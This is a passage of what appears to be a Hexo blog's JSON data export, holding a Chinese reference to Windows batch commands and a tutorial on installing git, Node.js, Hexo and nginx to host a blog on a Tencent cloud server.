d:mp4\npushd c:mp3 #保存当前目录，并切换当前目录为 c:mp3\npopd #恢复当前目录为刚才保存的 d:mp4\n\n37 for\n循环命令\n这个比较复杂，请对照 for/? 来看\nfor %%i in (c: d: e: f:) do echo %%i\n依次调用小括号里的每个字符串，执行 do 后面的命令\n注意%%i，在批处理中 for 语句调用参数用2个%\n默认的字符串分隔符是&quot;空格键&quot;，&quot;Tab键&quot;，&quot;回车键&quot;\nfor %%i in (*.txt) do find &quot;abc&quot; %%i\n对当前目录里所有的txt文件执行 find 命令\nfor /r . %%i in (*.txt) do find &quot;abc&quot; %%i\n在当前目录和子目录里所有的.txt文件中搜索包含 abc 字符串的行\nfor /r . %%i in (.) do echo %%~pni\n显示当前目录名和所有子目录名，包括路径，不包括盘符\nfor /r d:mp3 %%i in (*.mp3) do echo %%i&gt;&gt;d:mp3.txt\n把 d:mp3 及其子目录里的mp3文件的文件名都存到 d:mp3.txt 里去\nfor /l %%i in (2,1,8) do echo %%i\n生成2345678的一串数字，2是数字序列的开头，8是结尾，1表示每次加1\nfor /f %%i in (&#39;set&#39;) do echo %%i\n对 set 命令的输出结果循环调用，每行一个\nfor /f &quot;eol=P&quot; %%i in (&#39;set&#39;) do echo %%i\n取 set 命令的输出结果，忽略以 P 开头的那几行\nfor /f %%i in (d:mp3.txt) do echo %%i\n显示 d:mp3.txt 里的每个文件名，每行一个，不支持带空格的名称\nfor /f &quot;delims=&quot; %%i in (d:mp3.txt) do echo %%i\n显示 d:mp3.txt 里的每个文件名，每行一个，支持带空格的名称\nfor /f &quot;skip=5 tokens=4&quot; %%a in (&#39;dir&#39;) do echo %%a\n对 dir 命令的结果，跳过前面5行，余下的每行取第4列\n每列之间的分隔符为默认的&quot;空格&quot;\n可以注意到 dir 命令输出的前5行是没有文件名的\nfor /f &quot;tokens=1,2,3 delims=- &quot; %%a in (&#39;date /t&#39;) do (\necho %%a\necho %%b\necho %%c\n)\n对 date /t 的输出结果，每行取1、2、3列\n第一列对应指定的 %%a ，后面的 %%b 和 %%c 是派生出来的，对应其它列\n分隔符指定为 - 和&quot;空格&quot;，注意 delims=- 后面有个&quot;空格&quot;\n其中 tokens=1,2,3 若用 tokens=1-3 替换，效果是一样的\nfor /f &quot;tokens=2* delims=- &quot; %%a in (&#39;date /t&#39;) do echo %%b\n取第2列给 %%a ，其后的列都给 %%b\n\n38 subst (外部命令)\n映射磁盘。\nsubst z: serverd #这样输入z:就可以访问serverd了\nsubst z: /d #取消该映射\nsubst #显示目前所有的映时\n\n39 xcopy (外部命令)\n文件拷贝\nxcopy d:mp3 e:mp3 /s/e/i/y\n复制 d:mp3 文件夹、所有子文件夹和文件到 e: ，覆盖已有文件\n加 /i 表示如果 e: 没有 mp3 文件夹就自动新建一个，否则会有询问</code></pre>","site":{"data":{}},"excerpt":"<hr>\n<hr>\n<h1 id=\"bat批处理命令及解释\"><a href=\"#bat批处理命令及解释\" class=\"headerlink\" title=\"bat批处理命令及解释\"></a>bat批处理命令及解释</h1><p><a href=\"https://www.cnblogs.com/xpwi/p/9626959.html\">相关原文链接</a></p>\n<h2 id=\"一、批处理概念\"><a href=\"#一、批处理概念\" class=\"headerlink\" title=\"一、批处理概念\"></a>一、批处理概念</h2><ul>\n<li>批处理文件：包含DOS命令的可编辑可执行文件</li>\n<li>批处理：可以对某一对象批量操作的文件</li>\n</ul>","more":"<h2 id=\"二、批处理命令简介\"><a href=\"#二、批处理命令简介\" class=\"headerlink\" title=\"二、批处理命令简介\"></a>二、批处理命令简介</h2><h3 id=\"命令1-10\"><a href=\"#命令1-10\" class=\"headerlink\" title=\"命令1~10\"></a>命令1~10</h3><pre><code>1 echo 和 @\n回显命令\n@  #关闭单行回显\necho off  #从下一行开始关闭回显\n@echo off  #从本行开始关闭回显。一般批处理第一行都是这个\necho on #从下一行开始打开回显\necho #显示当前是 echo off 状态还是 echo on 状态\necho. #输出一个”回车换行”，空白行\n#(同echo, echo; echo+ echo[ echo] echo/ echo)\n\n2 errorlevel\necho %errorlevel%\n每个命令运行结束，可以用这个命令行格式查看返回码\n默认值为0，一般命令执行出错会设 errorlevel 为1\n\n3 dir\n显示文件夹内容\ndir #显示当前目录中的文件和子目录\ndir /a #显示当前目录中的文件和子目录，包括隐藏文件和系统文件\ndir c: /a:d #显示 C 盘当前目录中的目录\ndir c: /a:-d #显示 C 盘根目录中的文件\ndir c: /b/p #/b只显示文件名，/p分页显示\ndir *.exe /s #显示当前目录和子目录里所有的.exe文件\n\n4 cd\n切换目录\ncd #进入根目录\ncd #显示当前目录\ncd /d d:sdk #可以同时更改盘符和目录\n\n5 md\n创建目录\nmd d:abc #如果 d:a 不存在，将会自动创建中级目录\n#如果命令扩展名被停用，则需要键入 mkdir abc\n\n6 rd\n删除目录\nrd abc #删除当前目录里的 abc 子目录，要求为空目录\nrd /s/q d:temp #删除 d:temp 文件夹及其子文件夹和文件，/q安静模式\n\n7 del\n删除文件\ndel d:test.txt #删除指定文件，不能是隐藏、系统、只读文件\ndel /q/a/f d:temp*.*\n删除 d:temp 文件夹里面的所有文件，包括隐藏、只读、系统文件，不包括子目录\ndel /q/a/f/s d:temp*.*\n删除 d:temp 及子文件夹里面的所有文件，包括隐藏、只读、系统文件，不包括子目录\n\n8 ren\n重命名命令\nren d:temp tmp #支持对文件夹的重命名\n\n9 cls\n清屏\n10 type\n显示文件内容\ntype c:boot.ini #显示指定文件的内容，程序文件一般会显示乱码\ntype *.txt #显示当前目录里所有.txt文件的内容\n\n</code></pre><h3 id=\"命令11-20\"><a href=\"#命令11-20\" class=\"headerlink\" title=\"命令11~20\"></a>命令11~20</h3><pre><code>11 copy\n拷贝文件\ncopy c:test.txt d:test.bak\n复制 c:test.txt 文件到 d: ，并重命名为 test.bak\ncopy con test.txt\n从屏幕上等待输入，按 Ctrl+Z 结束输入，输入内容存为test.txt文件\ncon代表屏幕，prn代表打印机，nul代表空设备\ncopy 1.txt + 2.txt 3.txt\n合并 1.txt 和 2.txt 的内容，保存为 3.txt 文件\n如果不指定 3.txt ，则保存到 1.txt\ncopy test.txt +\n复制文件到自己，实际上是修改了文件日期\n\n12 title\n设置cmd窗口的标题\ntitle 新标题 #可以看到cmd窗口的标题栏变了\n\n13 ver\n显示系统版本\n\n14 label 和 vol\n设置卷标\nvol #显示卷标\nlabel #显示卷标，同时提示输入新卷标\nlabel c:system #设置C盘的卷标为 system\n\n15 pause\n暂停命令 //常用于使命令行窗口暂停，不至于打开bat文件后立即结束\n\n16 rem 和 ::\n注释命令\n注释行不执行操作\n\n17 date 和 time\n日期和时间\ndate #显示当前日期，并提示输入新日期，按&quot;回车&quot;略过输入\ndate/t #只显示当前日期，不提示输入新日期\ntime #显示当前时间，并提示输入新时间，按&quot;回车&quot;略过输入\ntime/t #只显示当前时间，不提示输入新时间\n\n18 goto 和 :\n跳转命令\n:label #行首为:表示该行是标签行，标签行不执行操作\ngoto label #跳转到指定的标签那一行\n\n19 find (外部命令)\n查找命令\nfind &quot;abc&quot; c:test.txt\n在 c:test.txt 文件里查找含 abc 字符串的行\n如果找不到，将设 errorlevel 返回码为1\nfind /i “abc” c:test.txt\n查找含 abc 的行，忽略大小写\nfind /c &quot;abc&quot; c:test.txt\n显示含 abc 的行的行数\n\n20 more (外部命令)\n逐屏显示\nmore c:test.txt #逐屏显示 c:test.txt 的文件内容</code></pre><h3 id=\"命令21-30\"><a href=\"#命令21-30\" class=\"headerlink\" title=\"命令21~30\"></a>命令21~30</h3><pre><code>21 tree\n显示目录结构\ntree d: #显示D盘的文件目录结构\n\n22 &amp;\n顺序执行多条命令，而不管命令是否执行成功\n\n23 &amp;&amp;\n顺序执行多条命令，当碰到执行出错的命令后将不执行后面的命令\nfind &quot;ok&quot; c:test.txt &amp;&amp; echo 成功\n如果找到了&quot;ok&quot;字样，就显示&quot;成功&quot;，找不到就不显示\n\n24 ||\n顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令\nfind &quot;ok&quot; c:test.txt || echo 不成功\n如果找不到&quot;ok&quot;字样，就显示&quot;不成功&quot;，找到了就不显示\n\n25 |\n管道命令\ndir *.* /s/a | find /c &quot;.exe&quot;\n管道命令表示先执行 dir 命令，对其输出的结果执行后面的 find 命令\n该命令行结果：输出当前文件夹及所有子文件夹里的.exe文件的个数\ntype c:test.txt|more\n这个和 more c:test.txt 的效果是一样的\n\n26 &gt; 和 &gt;&gt;\n输出重定向命令\n&gt; 清除文件中原有的内容后再写入\n&gt;&gt; 追加内容到文件末尾，而不会清除原有的内容\n主要将本来显示在屏幕上的内容输出到指定文件中\n指定文件如果不存在，则自动生成该文件\ntype c:test.txt &gt;prn\n屏幕上不显示文件内容，转向输出到打印机\necho hello world&gt;con\n在屏幕上显示hello world，实际上所有输出都是默认 &gt;con 的\ncopy c:test.txt f: &gt;nul\n拷贝文件，并且不显示&quot;文件复制成功&quot;的提示信息，但如果f盘不存在，还是会显示出错信息\ncopy c:test.txt f: &gt;nul 2&gt;nul\n不显示”文件复制成功”的提示信息，并且f盘不存在的话，也不显示错误提示信息\necho ^^W ^&gt; ^W&gt;c:test.txt\n生成的文件内容为 ^W &gt; W\n^ 和 &gt; 是控制命令，要把它们输出到文件，必须在前面加个 ^ 符号\n\n27 &lt;\n从文件中获得输入信息，而不是从屏幕上\n一般用于 date time label 等需要等待输入的命令\n@echo off\necho 2005-05-01&gt;temp.txt\ndate &lt;temp.txt\ndel temp.txt\n这样就可以不等待输入直接修改当前日期\n\n28 %0 %1 %2 %3 %4 %5 %6 %7 %8 %9 %*\n命令行传递给批处理的参数  //上一个命令的结果作为参数\n%0 批处理文件本身\n%1 第一个参数\n%9 第九个参数\n%* 从第一个参数开始的所有参数\n批参数(%n)的替代已被增强。您可以使用以下语法:\n%~1 - 删除引号(&quot; )， 扩充 %1\n%~f1 - 将 %1 扩充到一个完全合格的路径名\n%~d1 - 仅将 %1 扩充到一个驱动器号\n%~p1 - 仅将 %1 扩充到一个路径\n%~n1 - 仅将 %1 扩充到一个文件名\n%~x1 - 仅将 %1 扩充到一个文件扩展名\n%~s1 - 扩充的路径指含有短名\n%~a1 - 将 %1 扩充到文件属性\n%~t1 - 将 %1 扩充到文件的日期/时间\n%~z1 - 将 %1 扩充到文件的大小\n%~$PATH : 1 - 查找列在 PATH 环境变量的目录，并将 %1\n扩充到找到的第一个完全合格的名称。如果环境\n变量名未被定义，或者没有找到文件，此组合键会\n扩充到空字符串\n可以组合修定符来取得多重结果:\n%~dp1 - 只将 %1 扩展到驱动器号和路径\n%~nx1 - 只将 %1 扩展到文件名和扩展名\n%~dp$PATH:1 - 在列在 PATH 环境变量中的目录里查找 %1，\n并扩展到找到的第一个文件的驱动器号和路径。\n%~ftza1 - 将 %1 扩展到类似 DIR 的输出行。\n可以参照 call/? 或 for/? 看出每个参数的含意\necho load &quot;%%1&quot; &quot;%%2&quot;&gt;c:test.txt\n生成的文件内容为 load &quot;%1&quot;  &quot;%2&quot;\n批处理文件里，用这个格式把命令行参数输出到文件\n\n29 if\n判断命令\nif &quot;%1&quot;==&quot;/a&quot; echo 第一个参数是/a\nif /i &quot;%1&quot; equ &quot;/a&quot; echo 第一个参数是/a\n/i 表示不区分大小写，equ 和 == 是一样的，其它运算符参见 if/?\nif exist c:test.bat echo 存在c:test.bat文件\nif not exist c:windows (\necho 不存在c:windows文件夹\n)\nif exist c:test.bat (\necho 存在c:test.bat\n) else (\necho 不存在c:test.bat\n)\n30 setlocal 和 endlocal\n设置”命令扩展名”和”延缓环境变量扩充”\nSETLOCAL ENABLEEXTENSIONS #启用&quot;命令扩展名&quot;\nSETLOCAL DISABLEEXTENSIONS #停用&quot;命令扩展名&quot;\nSETLOCAL ENABLEDELAYEDEXPANSION #启用&quot;延缓环境变量扩充&quot;\nSETLOCAL DISABLEDELAYEDEXPANSION #停用&quot;延缓环境变量扩充&quot;\nENDLOCAL #恢复到使用SETLOCAL语句以前的状态\n“命令扩展名”默认为启用\n“延缓环境变量扩充”默认为停用\n批处理结束系统会自动恢复默认值\n可以修改注册表以禁用&quot;命令扩展名&quot;，详见 cmd /? 。所以用到&quot;命令扩展名&quot;的程\n序，建议在开头和结尾加上 SETLOCAL ENABLEEXTENSIONS 和 ENDLOCAL 语句，以确\n保程序能在其它系统上正确运行\n&quot;延缓环境变量扩充&quot;主要用于 if 和 for 的符合语句，在 set 的说明里有其实用例程</code></pre><h3 id=\"命令31-39\"><a href=\"#命令31-39\" class=\"headerlink\" title=\"命令31~39\"></a>命令31~39</h3><pre><code>31 set\n设置变量\n引用变量可在变量名前后加 % ，即 %变量名%\nset #显示目前所有可用的变量，包括系统变量和自定义的变量\necho %SystemDrive% #显示系统盘盘符。系统变量可以直接引用\nset p #显示所有以p开头的变量，要是一个也没有就设errorlevel=1\nset p=aa1bb1aa2bb2 #设置变量p，并赋值为 = 后面的字符串，即aa1bb1aa2bb2\necho %p% #显示变量p代表的字符串，即aa1bb1aa2bb2\necho %p:~6% #显示变量p中第6个字符以后的所有字符，即aa2bb2\necho %p:~6,3% #显示第6个字符以后的3个字符，即aa2\necho %p:~0,3% #显示前3个字符，即aa1\necho %p:~-2% #显示最后面的2个字符，即b2\necho %p:~0,-2% #显示除了最后2个字符以外的其它字符，即aa1bb1aa2b\necho %p:aa=c% #用c替换变量p中所有的aa，即显示c1bb1c2bb2\necho %p:aa=% #将变量p中的所有aa字符串置换为空，即显示1bb12bb2\necho %p:*bb=c% #第一个bb及其之前的所有字符被替换为c，即显示c1aa2bb2\nset p=%p:*bb=c% #设置变量p，赋值为 %p:*bb=c% ，即c1aa2bb2\nset /a p=39 #设置p为数值型变量，值为39\nset /a p=39/10 #支持运算符，有小数时用去尾法，39/10=3.9，去尾得3，p=3\nset /a p=p/10 #用 /a 参数时，在 = 后面的变量可以不加%直接引用\nset /a p=”1&amp;0″ #”与”运算，要加引号。其它支持的运算符参见set/?\nset p= #取消p变量\nset /p p=请输入\n屏幕上显示”请输入”，并会将输入的字符串赋值给变量p\n注意这条可以用来取代 choice 命令\n注意变量在 if 和 for 的复合语句里是一次性全部替换的，如\n@echo off\nset p=aaa\nif %p%==aaa (\necho %p%\nset p=bbb\necho %p%\n)\n结果将显示\naaa\naaa\n因为在读取 if 语句时已经将所有 %p% 替换为aaa\n这里的&quot;替换&quot;，在 /? 帮助里就是指&quot;扩充&quot;、&quot;环境变量扩充&quot;\n可以启用”延缓环境变量扩充”，用 ! 来引用变量，即 !变量名!\n@echo off\nSETLOCAL ENABLEDELAYEDEXPANSION\nset p=aaa\nif %p%==aaa (\necho %p%\nset p=bbb\necho !p!\n)\nENDLOCAL\n结果将显示\naaa\nbbb\n还有几个动态变量，运行 set 看不到\n%CD% #代表当前目录的字符串\n%DATE% #当前日期\n%TIME% #当前时间\n%RANDOM% #随机整数，介于0~32767\n%ERRORLEVEL% #当前 ERRORLEVEL 值\n%CMDEXTVERSION% #当前命令处理器扩展名版本号\n%CMDCMDLINE% #调用命令处理器的原始命令行\n可以用echo命令查看每个变量值，如 echo %time%\n注意 %time% 精确到毫秒，在批处理需要延时处理时可以用到\n\n32 start\n批处理中调用外部程序的命令，否则等外部程序完成后才继续执行剩下的指令\n\n33 call\n批处理中调用另外一个批处理的命令，否则剩下的批处理指令将不会被执行\n有时有的应用程序用start调用出错的，也可以call调用\n\n34 choice (外部命令)\n选择命令\n让用户输入一个字符，从而选择运行不同的命令，返回码errorlevel为1234……\nwin98里是choice.com\nwin2000pro里没有，可以从win98里拷过来\nwin2003里是choice.exe\nchoice /N /C y /T 5 /D y&gt;nul\n延时5秒\n\n35 assoc 和 ftype\n文件关联\nassoc 设置&#39;文件扩展名&#39;关联，关联到&#39;文件类型&#39;\nftype 设置&#39;文件类型&#39;关联，关联到&#39;执行程序和参数&#39;\n当你双击一个.txt文件时，windows并不是根据.txt直接判断用 notepad.exe 打开\n而是先判断.txt属于 txtfile &#39;文件类型&#39;\n再调用 txtfile 关联的命令行 txtfile=%SystemRoot%system32NOTEPAD.EXE %1\n可以在&quot;文件夹选项&quot;→&quot;文件类型&quot;里修改这2种关联\nassoc #显示所有&#39;文件扩展名&#39;关联\nassoc .txt #显示.txt代表的&#39;文件类型&#39;，结果显示 .txt=txtfile\nassoc .doc #显示.doc代表的&#39;文件类型&#39;，结果显示 .doc=Word.Document.8\nassoc .exe #显示.exe代表的&#39;文件类型&#39;，结果显示 .exe=exefile\nftype #显示所有&#39;文件类型&#39;关联\nftype exefile #显示exefile类型关联的命令行，结果显示 exefile=&quot;%1&quot; %*\nassoc .txt=Word.Document.8\n设置.txt为word类型的文档，可以看到.txt文件的图标都变了\nassoc .txt=txtfile\n恢复.txt的正确关联\nftype exefile=&quot;%1&quot; %*\n恢复 exefile 的正确关联\n如果该关联已经被破坏，可以运行 command.com ，再输入这条命令\n\n36 pushd 和 popd\n切换当前目录\n@echo off\nc: &amp; cd &amp; md mp3 #在 C: 建立 mp3 文件夹\nmd d:mp4 #在 D: 建立 mp4 文件夹\ncd /d d:mp4 #更改当前目录为 d:mp4\npushd c:mp3 #保存当前目录，并切换当前目录为 c:mp3\npopd #恢复当前目录为刚才保存的 d:mp4\n\n37 for\n循环命令\n这个比较复杂，请对照 for/? 来看\nfor %%i in (c: d: e: f:) do echo %%i\n依次调用小括号里的每个字符串，执行 do 后面的命令\n注意%%i，在批处理中 for 语句调用参数用2个%\n默认的字符串分隔符是&quot;空格键&quot;，&quot;Tab键&quot;，&quot;回车键&quot;\nfor %%i in (*.txt) do find &quot;abc&quot; %%i\n对当前目录里所有的txt文件执行 find 命令\nfor /r . %%i in (*.txt) do find &quot;abc&quot; %%i\n在当前目录和子目录里所有的.txt文件中搜索包含 abc 字符串的行\nfor /r . %%i in (.) do echo %%~pni\n显示当前目录名和所有子目录名，包括路径，不包括盘符\nfor /r d:mp3 %%i in (*.mp3) do echo %%i&gt;&gt;d:mp3.txt\n把 d:mp3 及其子目录里的mp3文件的文件名都存到 d:mp3.txt 里去\nfor /l %%i in (2,1,8) do echo %%i\n生成2345678的一串数字，2是数字序列的开头，8是结尾，1表示每次加1\nfor /f %%i in (&#39;set&#39;) do echo %%i\n对 set 命令的输出结果循环调用，每行一个\nfor /f &quot;eol=P&quot; %%i in (&#39;set&#39;) do echo %%i\n取 set 命令的输出结果，忽略以 P 开头的那几行\nfor /f %%i in (d:mp3.txt) do echo %%i\n显示 d:mp3.txt 里的每个文件名，每行一个，不支持带空格的名称\nfor /f &quot;delims=&quot; %%i in (d:mp3.txt) do echo %%i\n显示 d:mp3.txt 里的每个文件名，每行一个，支持带空格的名称\nfor /f &quot;skip=5 tokens=4&quot; %%a in (&#39;dir&#39;) do echo %%a\n对 dir 命令的结果，跳过前面5行，余下的每行取第4列\n每列之间的分隔符为默认的&quot;空格&quot;\n可以注意到 dir 命令输出的前5行是没有文件名的\nfor /f &quot;tokens=1,2,3 delims=- &quot; %%a in (&#39;date /t&#39;) do (\necho %%a\necho %%b\necho %%c\n)\n对 date /t 的输出结果，每行取1、2、3列\n第一列对应指定的 %%a ，后面的 %%b 和 %%c 是派生出来的，对应其它列\n分隔符指定为 - 和&quot;空格&quot;，注意 delims=- 后面有个&quot;空格&quot;\n其中 tokens=1,2,3 若用 tokens=1-3 替换，效果是一样的\nfor /f &quot;tokens=2* delims=- &quot; %%a in (&#39;date /t&#39;) do echo %%b\n取第2列给 %%a ，其后的列都给 %%b\n\n38 subst (外部命令)\n映射磁盘。\nsubst z: serverd #这样输入z:就可以访问serverd了\nsubst z: /d #取消该映射\nsubst #显示目前所有的映时\n\n39 xcopy (外部命令)\n文件拷贝\nxcopy d:mp3 e:mp3 /s/e/i/y\n复制 d:mp3 文件夹、所有子文件夹和文件到 e: ，覆盖已有文件\n加 /i 表示如果 e: 没有 mp3 文件夹就自动新建一个，否则会有询问</code></pre>"},{"title":"hexo+腾讯云","date":"2020-01-19T09:14:50.000Z","comments":1,"_content":"\n\n\n## hexo＋腾讯云主机搭建博客\n\n- [参考链接1](https://zhuanlan.zhihu.com/p/120322118)\n- [参考链接2](https://www.jianshu.com/p/31eb5c754c01)\n- [参考链接3](https://zhuanlan.zhihu.com/p/60578464)\n\n+ 说明：不建议用hexo在云主机上搭建博客，感觉多此一举，建议hexo+github， wordpress+云主机（宝塔界面更快哦）\n\n<!--more-->\n\n### 一．Git安装\n\n- 我使用的云主机是centos8系统的，之前也用过ubuntu18系统，但是感觉效果不怎的，可能试的次数比较少吧\n- 先检查是否有git\n\n```\ngit --version\n```\n\n- 没有则安装，旧的卸载重装\n\n```\n＃卸载旧的git\nyum remove git\n# 安装依赖库\nyum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel\n# 将git下载安装到/usr/local/src目录\ncd /usr/local/src\nwget http://ftp.ntu.edu.tw/software/scm/git/git-2.26.0.tar.gz\ntar -zvxf git-2.26.0.tar.gz\n# 进入目录\ncd git-2.26.0\n# 编译执行\nmake prefix=/usr/local/git all\n# 安装 git 到 /usr/local/git 目录下\nmake prefix=/usr/local/git install\n\n```\n\n### 二、配置Git环境变量\n\n- 打开环境变量配置文件进行配置\n\n```\nvim /etc/profile\n\n#添加以下内容\nPATH=$PATH:/usr/local/git/bin   # git 的目录\nexport PATH\n\n# 使配置的环境变量生效\nsource /etc/profile\n```\n\n- 验证git安装成功\n\n```\ngit --version\n```\n\n### 三、云主机与GitHub交换SSH密匙\n\n- Git初始化\n\n```\n# 设置github昵称\ngit config --global user.name 'mxrmiss'\n# 设置github邮箱\ngit config --global user.email 'heroli520@outlook.com'\n```\n\n- git status 无法显示中文\n\n```\ngit config --global core.quotepath false\n```\n\n- 创建ssh密匙\n\n```\nssh-keygen -t rsa -C \"GitHub 邮箱\"\n```\n\n- 输出 id_rsa.pub 内容并复制到GitHub中的setting页面上\n\n```\ncat id_rsa.pub\n```\n\n[![syONLT.jpg](https://s3.ax1x.com/2021/01/18/syONLT.jpg)](https://imgchr.com/i/syONLT)\n\n- ssh -T [git@github.com](mailto:git@github.com) 输入此命令，显示successful表示成功\n\n### 四、node.js安装\n\n1. node.js下载\n\n```\ncd /opt\nwget https://npm.taobao.org/mirrors/node/v10.16.0/node-v10.16.0-linux-x64.tar.xz  # 下载二进制安装包\n```\n\n2. node.js部署\n\n```\ncd /opt\ntar xf node-v10.16.0-linux-x64.tar.xz \nln -s node-v10.16.0-linux-x64 nodejs\nnodejs -> node-v10.16.0-linux-x64\n```\n\n3. 版本信息\n\n```\ncd /opt/nodejs/bin\n./node -v\n会看到 v10.16.0\n```\n\n4. 创建软连接\n\n```\nln -s /opt/nodejs/bin/node /usr/local/bin/node\nln -s /opt/nodejs/bin/npm  /usr/local/bin/npm\n\n# 验证\nnode -v\n```\n\n### 五、hexo 部署\n\n1. 安装hexo\n\n```\nnpm install hexo-cli -g \n```\n\n2. 采用软连接的方式将hexo添加入全局变量\n\n```\nln -s /opt/nodejs/lib/node_modules/hexo-cli/bin/hexo /usr/local/bin/hexo\n```\n\n3. 将自己GitHub中存储的hexo博客ssh下载到主机中\n\n### 六、使用Nginx部署Hexo站点\n\n1. Nginx安装\n\n```\nyum install -y nginx\n```\n\n2. 配置Nginx\n\n```\nnginx -t\n```\n\n3. 使用vim打开nginx.conf文件\n\n- 注意：有时该配置文件会不同于下面显示的，请参考网上其他教程从官网下载\n\n```\nvim /etc/nginx/nginx.conf\n```\n\n[![s6S4k8.png](https://s3.ax1x.com/2021/01/18/s6S4k8.png)](https://imgchr.com/i/s6S4k8)\n\n4. 启动Nginx\n\n```\nsystemctl start nginx.service\n```\n\n5. 重启Nginx\n\n```\nsystemctl restart nginx.service\n```\n\n### 七、配置本地hexo\n\n- 博客根目录_config下增加\n\n```\ndeploy:\n    type: git  (必须是git)\n    repo: root@***(服务器外网ip):#仓库地址\n    branch: master   \n```\n\n- 进入自己的hexo博客目录\n- hexo clean\n- hexo g\n- hexo d\n- 搜索自己的域名便可访问","source":"_posts/hexo+腾讯云主机搭建博客.md","raw":"---\ntitle: hexo+腾讯云\ndate: 2020/1/19 17:14:50\ncomments: ture\ncategories:\n- hexo\ntags:\n- hexo\n---\n\n\n\n## hexo＋腾讯云主机搭建博客\n\n- [参考链接1](https://zhuanlan.zhihu.com/p/120322118)\n- [参考链接2](https://www.jianshu.com/p/31eb5c754c01)\n- [参考链接3](https://zhuanlan.zhihu.com/p/60578464)\n\n+ 说明：不建议用hexo在云主机上搭建博客，感觉多此一举，建议hexo+github， wordpress+云主机（宝塔界面更快哦）\n\n<!--more-->\n\n### 一．Git安装\n\n- 我使用的云主机是centos8系统的，之前也用过ubuntu18系统，但是感觉效果不怎的，可能试的次数比较少吧\n- 先检查是否有git\n\n```\ngit --version\n```\n\n- 没有则安装，旧的卸载重装\n\n```\n＃卸载旧的git\nyum remove git\n# 安装依赖库\nyum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel\n# 将git下载安装到/usr/local/src目录\ncd /usr/local/src\nwget http://ftp.ntu.edu.tw/software/scm/git/git-2.26.0.tar.gz\ntar -zvxf git-2.26.0.tar.gz\n# 进入目录\ncd git-2.26.0\n# 编译执行\nmake prefix=/usr/local/git all\n# 安装 git 到 /usr/local/git 目录下\nmake prefix=/usr/local/git install\n\n```\n\n### 二、配置Git环境变量\n\n- 打开环境变量配置文件进行配置\n\n```\nvim /etc/profile\n\n#添加以下内容\nPATH=$PATH:/usr/local/git/bin   # git 的目录\nexport PATH\n\n# 使配置的环境变量生效\nsource /etc/profile\n```\n\n- 验证git安装成功\n\n```\ngit --version\n```\n\n### 三、云主机与GitHub交换SSH密匙\n\n- Git初始化\n\n```\n# 设置github昵称\ngit config --global user.name 'mxrmiss'\n# 设置github邮箱\ngit config --global user.email 'heroli520@outlook.com'\n```\n\n- git status 无法显示中文\n\n```\ngit config --global core.quotepath false\n```\n\n- 创建ssh密匙\n\n```\nssh-keygen -t rsa -C \"GitHub 邮箱\"\n```\n\n- 输出 id_rsa.pub 内容并复制到GitHub中的setting页面上\n\n```\ncat id_rsa.pub\n```\n\n[![syONLT.jpg](https://s3.ax1x.com/2021/01/18/syONLT.jpg)](https://imgchr.com/i/syONLT)\n\n- ssh -T [git@github.com](mailto:git@github.com) 输入此命令，显示successful表示成功\n\n### 四、node.js安装\n\n1. node.js下载\n\n```\ncd /opt\nwget https://npm.taobao.org/mirrors/node/v10.16.0/node-v10.16.0-linux-x64.tar.xz  # 下载二进制安装包\n```\n\n2. node.js部署\n\n```\ncd /opt\ntar xf node-v10.16.0-linux-x64.tar.xz \nln -s node-v10.16.0-linux-x64 nodejs\nnodejs -> node-v10.16.0-linux-x64\n```\n\n3. 版本信息\n\n```\ncd /opt/nodejs/bin\n./node -v\n会看到 v10.16.0\n```\n\n4. 创建软连接\n\n```\nln -s /opt/nodejs/bin/node /usr/local/bin/node\nln -s /opt/nodejs/bin/npm  /usr/local/bin/npm\n\n# 验证\nnode -v\n```\n\n### 五、hexo 部署\n\n1. 安装hexo\n\n```\nnpm install hexo-cli -g \n```\n\n2. 采用软连接的方式将hexo添加入全局变量\n\n```\nln -s /opt/nodejs/lib/node_modules/hexo-cli/bin/hexo /usr/local/bin/hexo\n```\n\n3. 将自己GitHub中存储的hexo博客ssh下载到主机中\n\n### 六、使用Nginx部署Hexo站点\n\n1. Nginx安装\n\n```\nyum install -y nginx\n```\n\n2. 配置Nginx\n\n```\nnginx -t\n```\n\n3. 使用vim打开nginx.conf文件\n\n- 注意：有时该配置文件会不同于下面显示的，请参考网上其他教程从官网下载\n\n```\nvim /etc/nginx/nginx.conf\n```\n\n[![s6S4k8.png](https://s3.ax1x.com/2021/01/18/s6S4k8.png)](https://imgchr.com/i/s6S4k8)\n\n4. 启动Nginx\n\n```\nsystemctl start nginx.service\n```\n\n5. 重启Nginx\n\n```\nsystemctl restart nginx.service\n```\n\n### 七、配置本地hexo\n\n- 博客根目录_config下增加\n\n```\ndeploy:\n    type: git  (必须是git)\n    repo: root@***(服务器外网ip):#仓库地址\n    branch: master   \n```\n\n- 进入自己的hexo博客目录\n- hexo clean\n- hexo g\n- hexo d\n- 搜索自己的域名便可访问","slug":"hexo+腾讯云主机搭建博客","published":1,"updated":"2021-03-24T04:15:01.311Z","layout":"post","photos":[],"link":"","_id":"ckq3bl426000jdsvtgqihhikn","content":"<h2 id=\"hexo＋腾讯云主机搭建博客\"><a href=\"#hexo＋腾讯云主机搭建博客\" class=\"headerlink\" title=\"hexo＋腾讯云主机搭建博客\"></a>hexo＋腾讯云主机搭建博客</h2><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/120322118\">参考链接1</a></li>\n<li><a href=\"https://www.jianshu.com/p/31eb5c754c01\">参考链接2</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/60578464\">参考链接3</a></li>\n</ul>\n<ul>\n<li>说明：不建议用hexo在云主机上搭建博客，感觉多此一举，建议hexo+github， wordpress+云主机（宝塔界面更快哦）</li>\n</ul>\n<span id=\"more\"></span>\n\n<h3 id=\"一．Git安装\"><a href=\"#一．Git安装\" class=\"headerlink\" title=\"一．Git安装\"></a>一．Git安装</h3><ul>\n<li>我使用的云主机是centos8系统的，之前也用过ubuntu18系统，但是感觉效果不怎的，可能试的次数比较少吧</li>\n<li>先检查是否有git</li>\n</ul>\n<pre><code>git --version</code></pre><ul>\n<li>没有则安装，旧的卸载重装</li>\n</ul>\n<pre><code>＃卸载旧的git\nyum remove git\n# 安装依赖库\nyum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel\n# 将git下载安装到/usr/local/src目录\ncd /usr/local/src\nwget http://ftp.ntu.edu.tw/software/scm/git/git-2.26.0.tar.gz\ntar -zvxf git-2.26.0.tar.gz\n# 进入目录\ncd git-2.26.0\n# 编译执行\nmake prefix=/usr/local/git all\n# 安装 git 到 